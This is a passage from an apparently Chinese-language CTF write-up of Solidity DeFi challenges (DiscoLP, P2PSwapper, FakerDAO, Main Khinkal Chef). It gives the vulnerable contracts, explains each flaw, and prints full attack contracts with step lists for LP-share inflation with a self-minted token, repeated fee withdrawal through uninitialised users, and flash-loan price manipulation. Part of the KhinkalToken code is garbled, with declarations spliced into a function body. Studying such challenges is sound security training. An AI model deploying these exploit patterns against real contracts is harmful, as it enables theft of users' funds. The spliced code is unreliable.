uint256 _deadline) external payable returns (uint256[] memory _amounts);\n  function getAmountOut(uint256 _amountIn, uint256 _reserveIn, uint256 _reserveOut) external pure returns (uint256 _amountOut);\n&#125;\n\ninterface Router02 is Router01\n&#123;\n&#125;\n\ninterface PoolToken is IERC20\n&#123;\n&#125;\n\ninterface Pair is PoolToken\n&#123;\n  function token0() external view returns (address _token0);\n  function token1() external view returns (address _token1);\n  function price0CumulativeLast() external view returns (uint256 _price0CumulativeLast);\n  function price1CumulativeLast() external view returns (uint256 _price1CumulativeLast);\n  function getReserves() external view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast);\n  function mint(address _to) external returns (uint256 _liquidity);\n  function sync() external;\n&#125;\n\nAnalyze关于什么是流动性挖矿可以参考如下链接，讲的很形象：https://www.zhihu.com/question/449221683\n题目就是通过流动性挖矿产生disco token的收益，了解了流动性挖矿之后，就是要创建交易对也就是合约中的pair，从而获得disco，而我们只有1jimbo和1jambo想要获得100+的disco显然是不够的，但是创建你的交易对并没有限制token，所以可以自己发一个token再与tokena进行交易对创建，调用depositToken获取得到超过100流动性的DISCO，再把获取的流动性token由攻击者合约转给player即可。\nAttackimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\n\ninterface IUniswapV2Factory &#123;\n  event PairCreated(address indexed token0, address indexed token1, address pair, uint);\n\n  function getPair(address tokenA, address tokenB) external view returns (address pair);\n  function allPairs(uint) external view returns (address pair);\n  function allPairsLength() external view returns (uint);\n\n  function feeTo() external view returns (address);\n  function feeToSetter() external view returns (address);\n\n  function createPair(address tokenA, address tokenB) external returns (address pair);\n&#125;\n\ninterface IUniswapV2Router &#123;\n\tfunction WETH() external pure returns (address _token);\n\tfunction addLiquidity(address _tokenA, address _tokenB, uint256 _amountADesired, uint256 _amountBDesired, uint256 _amountAMin, uint256 _amountBMin, address _to, uint256 _deadline) external returns (uint256 _amountA, uint256 _amountB, uint256 _liquidity);\n\tfunction removeLiquidity(address _tokenA, address _tokenB, uint256 _liquidity, uint256 _amountAMin, uint256 _amountBMin, address _to, uint256 _deadline) external returns (uint256 _amountA, uint256 _amountB);\n\tfunction swapExactTokensForTokens(uint256 _amountIn, uint256 _amountOutMin, address[] calldata _path, address _to, uint256 _deadline) external returns (uint256[] memory _amounts);\n\tfunction swapETHForExactTokens(uint256 _amountOut, address[] calldata _path, address _to, uint256 _deadline) external payable returns (uint256[] memory _amounts);\n\tfunction getAmountOut(uint256 _amountIn, uint256 _reserveIn, uint256 _reserveOut) external pure returns (uint256 _amountOut);\n&#125;\n\ninterface Pair\n&#123;\n\tfunction token0() external view returns (address _token0);\n\tfunction token1() external view returns (address _token1);\n\tfunction price0CumulativeLast() external view returns (uint256 _price0CumulativeLast);\n\tfunction price1CumulativeLast() external view returns (uint256 _price1CumulativeLast);\n\tfunction getReserves() external view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast);\n\tfunction mint(address _to) external returns (uint256 _liquidity);\n\tfunction sync() external;\n&#125;\n\ninterface DiscoLP is IERC20 &#123;\n    function depositToken(address _token, uint256 _amount, uint256 _minShares) external;\n    function calcCostFromShares(uint256 _shares) external view returns (uint256);\n    function totalReserve() external view returns (uint256);\n&#125;\n\nlibrary $\n&#123;\n\taddress constant UniswapV2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f; // ropsten\n\taddress constant UniswapV2_ROUTER02 = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D; // ropsten\n&#125;\n\ncontract Token is ERC20 &#123;\n    constructor(string memory _name, string memory _symbol) ERC20(_name, _symbol) public &#123;\n        _mint(msg.sender, 2**256 - 1);\n    &#125;\n&#125;\n\ncontract Attack &#123;\n    uint256 public balance;\n    function attack (address instance, uint256 amount, address tokenA) public &#123;\n        address _factory = $.UniswapV2_FACTORY;\n        address _router = $.UniswapV2_ROUTER02;\n        Token evil = new Token(\"Evil Token\", \"EVIL\");\n        evil.approve(instance, 2**256 - 1);\n        evil.approve(_router, 2**256 - 1);\n        IERC20(tokenA).approve(_router, 2**256 - 1);\n        address pair = IUniswapV2Factory(_factory).createPair(address(evil), address(tokenA));\n        (uint256 amountA, uint256 amountB, uint256 _shares) = IUniswapV2Router(_router).addLiquidity(\n          address(evil),\n          address(tokenA),\n          100000000000 * 10 ** 18,\n          1 * 10 ** 18,\n          1, 1, address(this), 2**256 - 1);\n        DiscoLP(instance).depositToken(address(evil), amount, 1);\n        balance = DiscoLP(instance).balanceOf(address(this));\n         DiscoLP(instance).transfer(msg.sender,balance);\n    &#125;\n&#125;\n/**\n * step 1: get reserveToken() on instance\n * step 2: get token0 on Pair(reserveToken)\n * step 3: deploy attack contract\n * step 4: token0.transfer(attack contract, 1 * 10 ** 18)\n * step 5: attack(instance, 1000000000000 * 10 ** 18, token0)\n * step 6：transfer disco token to player \n */\n\n攻击步骤如上所写\n\n3.P2PSwapperRequest\n\n\n\n\n\n\n\n\nP2PSwapper is a super convenient zero-trust P2P DEX for any assets! The fee is flat so the whales are welcome! Also, we have a referral program, and all the fees are equally distributed between us and the lead owners.\nWe’ve created a sample trade and deposited some money for it. We wanna make sure you cannot withdraw the fees assigned for our trade.\nYou have to drain all the WETH tokens from the P2PSwapper’s balance.\nCodepragma solidity ^0.6.0;\n\n// helper methods for interacting with ERC20 tokens and sending ETH that do not consistently return true/false\nlibrary TransferHelper &#123;\n    function safeApprove(\n        address token,\n        address to,\n        uint256 value\n    ) internal &#123;\n        // bytes4(keccak256(bytes('approve(address,uint256)')));\n        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x095ea7b3, to, value));\n        require(\n            success &amp;&amp; (data.length == 0 || abi.decode(data, (bool))),\n            'TransferHelper::safeApprove: approve failed'\n        );\n    &#125;\n\n    function safeTransfer(\n        address token,\n        address to,\n        uint256 value\n    ) internal &#123;\n        // bytes4(keccak256(bytes('transfer(address,uint256)')));\n        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0xa9059cbb, to, value));\n        require(\n            success &amp;&amp; (data.length == 0 || abi.decode(data, (bool))),\n            'TransferHelper::safeTransfer: transfer failed'\n        );\n    &#125;\n\n    function safeTransferFrom(\n        address token,\n        address from,\n        address to,\n        uint256 value\n    ) internal &#123;\n        // bytes4(keccak256(bytes('transferFrom(address,address,uint256)')));\n        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x23b872dd, from, to, value));\n        require(\n            success &amp;&amp; (data.length == 0 || abi.decode(data, (bool))),\n            'TransferHelper::transferFrom: transferFrom failed'\n        );\n    &#125;\n\n    function safeTransferETH(address to, uint256 value) internal &#123;\n        (bool success, ) = to.call&#123;value: value&#125;(new bytes(0));\n        require(success, 'TransferHelper::safeTransferETH: ETH transfer failed');\n    &#125;\n&#125;\n\n\nlibrary SafeMath &#123;\n    function add(uint a, uint b) internal pure returns (uint c) &#123; c = a + b; require(c >= a); &#125;\n    function sub(uint a, uint b) internal pure returns (uint c) &#123; require(a >= b); c = a - b; &#125;\n    function mul(uint a, uint b) internal pure returns (uint c) &#123; c = a * b; require(a == 0 || c / a == b); &#125;\n    function div(uint a, uint b) internal pure returns (uint c) &#123; require(b > 0); c = a / b; &#125;\n&#125;\n\n\ncontract P2P_WETH &#123;\n    using SafeMath for uint;\n    string public name     = \"P2P SwapWrapped Ether\";\n    string public symbol   = \"P2PETH\";\n    uint8  public decimals = 18;\n\n    event  Approval(address indexed src, address indexed guy, uint wad);\n    event  Transfer(address indexed src, address indexed dst, uint wad);\n    event  Deposit(address indexed dst, uint wad);\n    event  Withdrawal(address indexed src, uint wad);\n\n    mapping (address => uint)                       public  balanceOf;\n    mapping (address => mapping (address => uint))  public  allowance;\n    \n    receive() payable external &#123;\n        deposit();\n    &#125;\n    \n    function deposit() public payable &#123;\n        balanceOf[msg.sender] = balanceOf[msg.sender].add(msg.value);\n        emit Deposit(msg.sender, msg.value);\n    &#125;\n    \n    function withdraw(\n        uint wad\n    ) public &#123;\n        require(balanceOf[msg.sender] >= wad);\n        balanceOf[msg.sender] = balanceOf[msg.sender].sub(wad);\n        payable(msg.sender).transfer(wad);\n        emit Withdrawal(msg.sender, wad);\n    &#125;\n\n    function totalSupply() public view returns (uint) &#123;\n        return address(this).balance;\n    &#125;\n\n    function approve(\n        address guy,\n        uint wad\n    ) public returns (bool) &#123;\n        allowance[msg.sender][guy] = wad;\n        emit Approval(msg.sender, guy, wad);\n        return true;\n    &#125;\n\n    function transfer(\n        address dst,\n        uint wad\n    ) public returns (bool) &#123;\n        return transferFrom(msg.sender, dst, wad);\n    &#125;\n\n    function transferFrom(\n        address src,\n        address dst,\n        uint wad\n    ) public returns (bool) &#123;\n        require(balanceOf[src] >= wad);\n        if (src != msg.sender &amp;&amp; allowance[src][msg.sender] != uint(2 ** 256-1 )) &#123;\n            require(allowance[src][msg.sender] >= wad);\n            allowance[src][msg.sender] -= wad;\n        &#125;\n        balanceOf[src] = balanceOf[src].sub(wad);\n        balanceOf[dst] = balanceOf[dst].add(wad);\n        emit Transfer(src, dst, wad);\n        return true;\n    &#125;    \n&#125;\n\ninterface IP2P_WETH &#123;\n    function deposit() external payable;\n    function transfer(address to, uint value) external returns (bool);\n    function withdraw(uint) external;\n    function balanceOf(address) external returns (uint);\n    function approve(address,uint) external returns (bool);\n&#125;\n\ncontract P2PSwapper &#123;\n    using SafeMath for uint;\n    \n    struct Deal &#123;\n        address initiator;\n        address bidToken;\n        uint bidPrice;\n        address askToken;\n        uint askAmount;\n        uint status;\n    &#125;\n\n    enum DealState &#123;\n        Active,\n        Succeeded,\n        Canceled,\n        Withdrawn\n    &#125;\n\n    event NewUser(address user, uint id, uint partnerId);\n    event WithdrawFees(address partner, uint userId, uint amount);\n    event NewDeal(address bidToken, uint bidPrice, address askToken, uint askAmount, uint dealId);\n    event TakeDeal(uint dealId, address bidder);\n    event CancelDeal(uint dealId);\n\n    uint public dealCount;\n    mapping(uint => Deal) public deals;\n    mapping(address => uint[]) private _dealHistory;\n    \n    uint public userCount;\n    mapping(uint => uint) public partnerFees;\n    mapping(address => uint) public distributedFees;\n    mapping(uint => uint) public partnerById;\n    mapping(address => uint) public userByAddress;\n    mapping(uint => address) public addressById;\n\n    IP2P_WETH public immutable p2pweth;\n\n    constructor(address weth) public &#123;\n        p2pweth = IP2P_WETH(weth);\n\n        userByAddress[msg.sender] = 1;\n        addressById[1] = msg.sender;\n        partnerById[1] = 1;\n    &#125;\n\n    bool private entered = false;\n    modifier nonReentrant() &#123;\n        require(entered == false, 'P2PSwapper: re-entrancy detected!');\n        entered = true;\n        _;\n        entered = false;\n    &#125;\n\n    function createDeal(\n        address bidToken,\n        uint bidPrice,\n        address askToken,\n        uint askAmount\n    ) external payable returns (uint dealId) &#123;\n        uint fee = msg.value;\n        require(fee > 31337, \"P2PSwapper: fee too low\");\n        p2pweth.deposit&#123;value: msg.value&#125;();\n        partnerFees[userByAddress[msg.sender]] = partnerFees[userByAddress[msg.sender]].add(fee.div(2));\n\n        TransferHelper.safeTransferFrom(bidToken, msg.sender, address(this), bidPrice);\n        dealId = _createDeal(bidToken, bidPrice, askToken, askAmount);\n    &#125;\n\n    function takeDeal(\n        uint dealId\n    ) external nonReentrant &#123;\n        require(dealCount >= dealId &amp;&amp; dealId > 0, \"P2PSwapper: deal not found\");\n\n        Deal storage deal = deals[dealId];\n        require(deal.status == 0, \"P2PSwapper: deal not available\");\n\n        TransferHelper.safeTransferFrom(deal.askToken, msg.sender, deal.initiator, deal.askAmount);\n        _takeDeal(dealId);\n    &#125;\n\n    function cancelDeal(\n        uint dealId\n    ) external nonReentrant &#123; \n        require(dealCount >= dealId &amp;&amp; dealId > 0, \"P2PSwapper: deal not found\");\n        \n        Deal storage deal = deals[dealId];\n        require(deal.initiator == msg.sender, \"P2PSwapper: access denied\");\n\n        TransferHelper.safeTransfer(deal.bidToken, msg.sender, deal.bidPrice);\n        \n        deal.status = 2;\n        emit CancelDeal(dealId);\n    &#125;\n\n    function status(\n        uint dealId\n    ) public view returns (DealState) &#123;\n        require(dealCount >= dealId &amp;&amp; dealId > 0, \"P2PSwapper: deal not found\");\n        Deal storage deal = deals[dealId];\n        if (deal.status == 1) &#123;\n            return DealState.Succeeded;\n        &#125; else if (deal.status == 2 || deal.status == 3) &#123;\n            return DealState(deal.status);\n        &#125; else &#123;\n            return DealState.Active;\n        &#125;\n    &#125;\n\n    function dealHistory(\n        address user\n    ) public view returns (uint[] memory) &#123;\n        return _dealHistory[user];\n    &#125;\n\n    function signup() public returns (uint) &#123;\n        return signup(1);\n    &#125;\n\n    function signup(uint partnerId) public returns (uint id) &#123;\n        require(userByAddress[msg.sender] == 0, \"P2PSwapper: user exists\");\n        require(addressById[partnerId] != address(0), \"P2PSwapper: partner not found\");\n        \n        id = ++userCount;\n        userByAddress[msg.sender] = id;\n        addressById[id] = msg.sender;\n        partnerById[id] = partnerId;\n\n        emit NewUser(msg.sender, id, partnerId);\n    &#125;\n\n    function withdrawFees(address user) public nonReentrant returns (uint fees) &#123;\n        uint userId = userByAddress[user];\n        require(partnerById[userId] == userByAddress[msg.sender], \"P2PSwapper: user is not your referral\");\n        \n        fees = partnerFees[userId].sub(distributedFees[user]);\n        require(fees > 0, \"P2PSwapper: no fees to distribute\");\n\n        distributedFees[user] = distributedFees[user].add(fees);\n        p2pweth.withdraw(fees);\n        TransferHelper.safeTransferETH(msg.sender, fees);\n\n        emit WithdrawFees(msg.sender, userId, fees);\n    &#125;\n\n    function _createDeal(\n        address bidToken,\n        uint bidPrice,\n        address askToken,\n        uint askAmount\n    ) private returns (uint dealId) &#123; \n        require(askToken != address(0), \"P2PSwapper: invalid address\");\n        require(bidPrice > 0, \"P2PSwapper: invalid bid price\");\n        require(askAmount > 0, \"P2PSwapper: invalid ask amount\");\n        dealId = ++dealCount;\n        Deal storage deal = deals[dealId];\n        deal.initiator = msg.sender;\n        deal.bidToken = bidToken;\n        deal.bidPrice = bidPrice;\n        deal.askToken = askToken;\n        deal.askAmount = askAmount;\n        \n        _dealHistory[msg.sender].push(dealId);\n        \n        emit NewDeal(bidToken, bidPrice, askToken, askAmount, dealId);\n    &#125;\n\n    function _takeDeal(\n        uint dealId\n    ) private &#123; \n        Deal storage deal = deals[dealId];\n\n        TransferHelper.safeTransfer(deal.bidToken, msg.sender, deal.bidPrice);\n\n        deal.status = 1;\n        emit TakeDeal(dealId, msg.sender);\n    &#125;\n\n    receive() external payable &#123;\n        require(msg.sender == address(p2pweth), \"P2PSwapper: transfer not allowed\");\n    &#125;\n &#125;\n\nAnalyze存在未初始化的问题\n\n在进行任何操作之前，一切uint数据类型的初始值都是0\n所以在withdrawfee时候每次换一个user（未初始化过的），distributedFees[user]&#x3D;0、userId&#x3D;userByAddress[user]&#x3D;0、partnerById[userId]&#x3D;0所以在fees &#x3D; partnerFees[userId].sub(distributedFees[user])语句赋值时候减数都是0，所以可以重复withdraw\nAttack清楚了漏洞原理，接下来就是进行攻击，原本的partnerFees[0]值为0，所以要先createDeal(p2pweth, 1, p2pweth, 1) {value:313338}。（在此之前要先deposit{value:1}并且approve(instance,1)以满足create中的transferfrom操作）此时P2PSwapper合约instance的余额 balanceOf([nstance]&#x3D; 313338+1+313338 &#x3D; 626677，partnerFees[0]变为156669，balanceOf([nstance]&#x3D;626677并非156669的整数倍（商四余一），所以只有让合约余额为156669的5倍即156669*5&#x3D;783345，差156,668，所以deposit{value:156668}，再把刚刚deposit的token转到instance中。\n再分别使用5个未初始化过的账户进行withdrawfee即可\nstep1：deposit&#123;value:1&#125;\nstep2：approve(instance,1)\nstep3：createDeal(p2pweth, 1, p2pweth, 1) &#123;value:313338&#125;\nstep4：deposit&#123;value:156668&#125;\nstep5：transfer(instance,156668)\nstep6：withdrawFees*5  每次user都是不同的且未初始化过\n\n\n4.FakerDAORequest\n\n\n\n\n\n\n\n\nFakerDAO is the best lending protocol! Only at FakerDAO you can borrow a LAMBO if you provide enough collateral in LP tokens!\nYou have 5000 YIN and 5000 YANG, can you borrow 1 LAMBO?\nCodepragma solidity ^0.6.0;\n\nimport \"@openzeppelin/contracts/utils/ReentrancyGuard.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/math/SafeMath.sol\";\n\ncontract FakerDAO is ERC20, ReentrancyGuard &#123;\n\n    using SafeMath for uint256;\n\n    address public immutable pair;\n\n    constructor (address _pair) public ERC20(\"Lambo\", \"LAMBO\") &#123;\n        _setupDecimals(0);\n        pair = _pair; // Uniswap YIN-YANG pair\n    &#125;\n\n    function borrow(uint256 _amount) public nonReentrant &#123;\n        uint256 _balance = Pair(pair).balanceOf(msg.sender);\n        uint256 _tokenPrice = price();\n        uint256 _depositRequired = _amount.mul(_tokenPrice);\n\n        require(_balance >= _depositRequired, \"Not enough collateral\");\n\n        // we get LP tokens\n        Pair(pair).transferFrom(msg.sender, address(this), _depositRequired);\n        // you get a LAMBO\n        _mint(msg.sender, _amount);\n    &#125;\n\n    function price() public view returns (uint256) &#123;\n        address token0 = Pair(pair).token0();\n        address token1 = Pair(pair).token1();\n        uint256 _reserve0 = IERC20(token0).balanceOf(pair);\n        uint256 _reserve1 = IERC20(token1).balanceOf(pair);\n        return (_reserve0 * _reserve1) / Pair(pair).totalSupply();\n    &#125;\n&#125;\n\nlibrary $\n&#123;\n\taddress constant UniswapV2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f; // ropsten\n\taddress constant UniswapV2_ROUTER02 = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D; // ropsten\n&#125;\n\ninterface PoolToken is IERC20\n&#123;\n&#125;\n\ninterface Pair is PoolToken\n&#123;\n\tfunction token0() external view returns (address _token0);\n\tfunction token1() external view returns (address _token1);\n\tfunction price0CumulativeLast() external view returns (uint256 _price0CumulativeLast);\n\tfunction price1CumulativeLast() external view returns (uint256 _price1CumulativeLast);\n\tfunction getReserves() external view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast);\n\tfunction mint(address _to) external returns (uint256 _liquidity);\n\tfunction sync() external;\n&#125;\n\nAnalyze首先需要了解uniswapv2协议，可以参考UniswapV2协议解析以及Uniswap-v2 Pair合约分析\n想要获得Lambo必须通过instance下的borrow函数，获得流动性代币则需要addliquidity从而触发mint函数获得流动性代币\nmint数量计算方法如下\nuint balance0 = IERC20(token0).balanceOf(address(this));\n        uint balance1 = IERC20(token1).balanceOf(address(this));\n        uint amount0 = balance0.sub(_reserve0);\n        uint amount1 = balance1.sub(_reserve1);\nif (_totalSupply == 0) &#123;\n    \n            liquidity = Math.sqrt(amount0.mul(amount1)).sub(MINIMUM_LIQUIDITY);\n           _mint(address(0), MINIMUM_LIQUIDITY); // permanently lock the first MINIMUM_LIQUIDITY tokens\n        &#125; else &#123;\n    \n            liquidity = Math.min(amount0.mul(_totalSupply) / _reserve0, amount1.mul(_totalSupply) / _reserve1);\n        &#125;\n\n在此处amount0和_totalSupply都是1000000*10 **18，将会抵消，所以添加流动性的代币数量就是最终mint的流动性代币，首先在攻击合约中添加流动性mint给攻击合约100个流动性代币，此时IERC20(token0).balanceOf(pair)和IERC20(token1).balanceOf(pair)和Pair(pair).totalSupply()都是1000100 * 10 * *18，计算的价格也将是这个数值，显然不够，所以我们可以利用uniswapv2的flash loan属性，先借出token1和token2.\n此时reserve还没有更新，最多只能借出999,999,999,999,999,999,999,999,假设另一个代币借出数量为0，经过计算price还比余额高出1*10 **18，所以将另一个代币借出1 \n\n\n经过计算此时的price恰好为100*10**18，即可满足borrow条件\n调用borrow，归还flash loan，再将lambo转移到player下\nAttacklibrary $\n&#123;\n    address constant UniswapV2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f; // ropsten\n    address constant UniswapV2_ROUTER02 = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D; // ropsten\n&#125;\ncontract Attack&#123;\n    address public instance;\n    address public pair;\n    address public router;\n    uint out0;\n    uint out1;\n    constructor(address _instance,address _pair,address _router) public&#123;\n        instance=_instance;\n        pair=_pair;\n        router=_router;\n        out0=1;\n        out1=999999999999999999999999;\n    &#125;\n\n    function attack() public &#123;\n        address token0 = Pair(pair).token0();\n        address token1 = Pair(pair).token1();\n        IERC20(token0).approve(router, uint256(-1));\n        IERC20(token1).approve(router, uint256(-1));\n        IERC20(pair).approve(instance, uint256(-1));\n        IUniswapV2Router(router).addLiquidity(token0,token1,100 * 10 ** 18,100 * 10 ** 18,1, 1, address(this), uint256(-1));\n        Pair(pair).swap(out0, out1, address(this), bytes('flash loan'));\n    &#125;\n    function uniswapV2Call(address _sender, uint _amount0, uint _amount1, bytes calldata _data) external  &#123;\n        address token0 = Pair(msg.sender).token0();\n        address token1 = Pair(msg.sender).token1();\n        FakerDAO(instance).borrow(1);\n        IERC20(token0).transfer(msg.sender, IERC20(token0).balanceOf(address(this)));\n        IERC20(token1).transfer(msg.sender, IERC20(token1).balanceOf(address(this)));\n    &#125;\n    function toPlayer() public &#123;\n        FakerDAO(instance).transfer(msg.sender, 1);\n    &#125;\n&#125;\ninterface IERC20&#123;\n    \n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address to, uint256 amount) external returns (bool);\n    function allowance(address owner, address spender) external view returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(\n        address from,\n        address to,\n        uint256 amount\n    ) external returns (bool);\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n&#125;\n\ninterface FakerDAO is IERC20&#123;\n    function borrow(uint256 _amount) external;\n&#125;\ninterface Pair is IERC20\n&#123;\n    function token0() external view returns (address _token0);\n    function token1() external view returns (address _token1);\n    function price0CumulativeLast() external view returns (uint256 _price0CumulativeLast);\n    function price1CumulativeLast() external view returns (uint256 _price1CumulativeLast);\n    function getReserves() external view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast);\n    function mint(address _to) external returns (uint256 _liquidity);\n    function sync() external;\n    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;\n&#125;\n\ninterface IUniswapV2Router &#123;\n    function WETH() external pure returns (address _token);\n    function addLiquidity(address _tokenA, address _tokenB, uint256 _amountADesired, uint256 _amountBDesired, uint256 _amountAMin, uint256 _amountBMin, address _to, uint256 _deadline) external returns (uint256 _amountA, uint256 _amountB, uint256 _liquidity);\n    function removeLiquidity(address _tokenA, address _tokenB, uint256 _liquidity, uint256 _amountAMin, uint256 _amountBMin, address _to, uint256 _deadline) external returns (uint256 _amountA, uint256 _amountB);\n    function swapExactTokensForTokens(uint256 _amountIn, uint256 _amountOutMin, address[] calldata _path, address _to, uint256 _deadline) external returns (uint256[] memory _amounts);\n    function swapETHForExactTokens(uint256 _amountOut, address[] calldata _path, address _to, uint256 _deadline) external payable returns (uint256[] memory _amounts);\n    function getAmountOut(uint256 _amountIn, uint256 _reserveIn, uint256 _reserveOut) external pure returns (uint256 _amountOut);\n&#125;\n\nstep1：获得token0和token1地址\nstep2：部署攻击合约\nstep3：IERC20(token0).transfer(Attack,5000*10**18)\nstep4：IERC20(token1).transfer(Attack,5000*10**18)\nstep5：attack\nstep6：toPlayer\n\n\n\n5.Main Khinkal Chefrequest\n\n\n\n\n\n\n\n\nMainChef is against slavery! Move from MasterChef to MainChef and move from SUSHIs to KHINKALs!\nPlease check if you can drain the funds from our main contract.\nYou have to drain all the KHINKAL tokens from the MainChef’s balance.\nCodepragma solidity 0.6.12;\n\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/SafeERC20.sol\";\nimport \"@openzeppelin/contracts/utils/EnumerableSet.sol\";\nimport \"@openzeppelin/contracts/math/SafeMath.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\n\ncontract LPToken is ERC20(\"LP Token\", \"LPT\"), Ownable &#123;\n    constructor() public &#123;\n        _mint(msg.sender, 10e18);\n    &#125;\n\n    function mint(address account, uint value) public onlyOwner &#123;\n        _mint(account, value);\n    &#125;\n\n&#125;\ncontract KhinkalToken is ERC20(\"KhinkalToken\", \"KHINKAL\"), Ownable &#123;\n    function mint(address _to, uint256 _amount) public onlyOwner &#123;\n        _mint(_to, _amount);\n        _moveDelegates(address(0), _delegates[_to], _amount);\n    mapping (address => address) internal _delegates;\n    struct Checkpoint &#123;\n        uint32 fromBlock;\n        uint256 votes;\n    &#125;\n    mapping (address => mapping (uint32 => Checkpoint)) public checkpoints;\n    mapping (address => uint32) public numCheckpoints;\n    bytes32 public constant DOMAIN_TYPEHASH = keccak256(\"EIP712Domain(string name,uint256 chainId,address verifyingContract)\");\n    bytes32 public constant DELEGATION_TYPEHASH = keccak256(\"Delegation(address delegatee,uint256 nonce,uint256 expiry)\");\n    mapping (address => uint) public nonces;\n    event DelegateChanged(address indexed delegator, address indexed fromDelegate, address indexed toDelegate);\n    event DelegateVotesChanged(address indexed delegate, uint previousBalance, uint newBalance);\n    function delegates(address delegator)external view returns (address)&#123;\n        return _delegates[delegator];\n    &#125;\n    function delegate(address delegatee) external &#123;\n        return _delegate(msg.sender, delegatee);\n    &#125;\n    function delegateBySig(\n        address delegatee,\n        uint nonce,\n        uint expiry,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    )\n        external\n    &#123;\n        bytes32 domainSeparator = keccak256(\n            abi.encode(\n                DOMAIN_TYPEHASH,\n                keccak256(bytes(name())),\n                getChainId(),\n                address(this)\n            )\n        );\n\n        bytes32 structHash = keccak256(\n            abi.encode(\n                DELEGATION_TYPEHASH,\n                delegatee,\n                nonce,\n                expiry\n            )\n        );\n\n        bytes32 digest = keccak256(\n            abi.encodePacked(\n                \"\\x19\\x01\",\n                domainSeparator,\n                structHash\n            )\n        );\n\n        address signatory = ecrecover(digest, v, r, s);\n        require(signatory != address(0), \"KHINKAL::delegateBySig: invalid signature\");\n        require(nonce == nonces[signatory]++, \"KHINKAL::delegateBySig: invalid nonce\");\n        require(now &lt;= expiry, \"KHINKAL::delegateBySig: signature expired\");\n        return _delegate(signatory, delegatee);\n    &#125;\n    function getCurrentVotes(address account)external view returns (uint256)&#123;\n        uint32 nCheckpoints = numCheckpoints[account];\n        return nCheckpoints > 0 ? checkpoints[account][nCheckpoints - 1].votes : 0;\n    &#125;\n    function getPriorVotes(address account, uint blockNumber)external view returns (uint256)\n    &#123;\n        require(blockNumber &lt; block.number, \"KHINKAL::getPriorVotes: not yet determined\");\n        uint32 nCheckpoints = numCheckpoints[account];\n        if (nCheckpoints == 0) &#123;\n            return 0;\n        &#125;\n        if (checkpoints[account][nCheckpoints - 1].fromBlock &lt;= blockNumber) &#123;\n            return checkpoints[account][nCheckpoints - 1].votes;\n        &#125;\n        if (checkpoints[account][0].fromBlock > blockNumber) &#123;\n            return 0;\n        &#125;\n        uint32 lower = 0;\n        uint32 upper = nCheckpoints - 1;\n        while (upper > lower) &#123;\n            uint32 center = upper - (upper - lower) / 2; // ceil, avoiding overflow\n            Checkpoint memory cp = checkpoints[account][center];\n            if (cp.fromBlock == blockNumber) &#123;\n                return cp.votes;\n            &#125; else if (cp.fromBlock &lt; blockNumber) &#123;\n                lower = center;\n            &#125; else &#123;\n                upper = center - 1;\n            &#125;\n        &#125;\n        return checkpoints[account][lower].votes;\n    &#125;\n\n    function _delegate(address delegator, address delegatee)internal&#123;\n        address currentDelegate = _delegates[delegator];\n        uint256 delegatorBalance = balanceOf(delegator); // balance of underlying KHINKALs (not scaled);\n        _delegates[delegator] = delegatee;\n\n        emit DelegateChanged(delegator, currentDelegate, delegatee);\n\n        _moveDelegates(currentDelegate, delegatee, delegatorBalance);\n    &#125;\n\n    function _moveDelegates(address srcRep, address dstRep, uint256 amount) internal &#123;\n        if (srcRep != dstRep &amp;&amp; amount > 0) &#123;\n            if (srcRep != address(0)) &#123;\n                // decrease old representative\n                uint32 srcRepNum = numCheckpoints[srcRep];\n                uint256 srcRepOld = srcRepNum > 0 ? checkpoints[srcRep][srcRepNum - 1].votes : 0;\n                uint256 srcRepNew = srcRepOld.sub(amount);\n                _writeCheckpoint(srcRep, srcRepNum, srcRepOld, srcRepNew);\n            &#125;\n\n            if (dstRep != address(0)) &#123;\n                // increase new representative\n                uint32 dstRepNum = numCheckpoints[dstRep];\n                uint256 dstRepOld = dstRepNum > 0 ? checkpoints[dstRep][dstRepNum - 1].votes : 0;\n                uint256 dstRepNew = dstRepOld.add(amount);\n                _writeCheckpoint(dstRep, dstRepNum, dstRepOld, dstRepNew);\n            &#125;\n        &#125;\n    &#125;\n\n    function _writeCheckpoint(address delegatee,uint32 nCheckpoints,uint256 oldVotes,uint256 newVotes)internal&#123;\n        uint32 blockNumber = safe32(block.number, \"KHINKAL::_writeCheckpoint: block number exceeds 32 bits\");\n\n        if (nCheckpoints > 0 &amp;&amp; checkpoints[delegatee][nCheckpoints - 1].fromBlock == blockNumber) &#123;\n            checkpoints[delegatee][nCheckpoints - 1].votes = newVotes;\n        &#125; else &#123;\n            checkpoints[delegatee][nCheckpoints] = Checkpoint(blockNumber, newVotes);\n            numCheckpoints[delegatee] = nCheckpoints + 1;\n        &#125;\n\n        emit DelegateVotesChanged(delegatee, oldVotes, newVotes);\n    &#125;\n\n    function safe32(uint n, string memory errorMessage) internal pure returns (uint32) &#123;\n        require(n &lt; 2**32, errorMessage);\n        return uint32(n);\n    &#125;\n    function getChainId() internal pure returns (uint) &#123;\n        uint256 chainId;\n        assembly &#123; chainId := chainid() &#125;\n        return chainId;\n    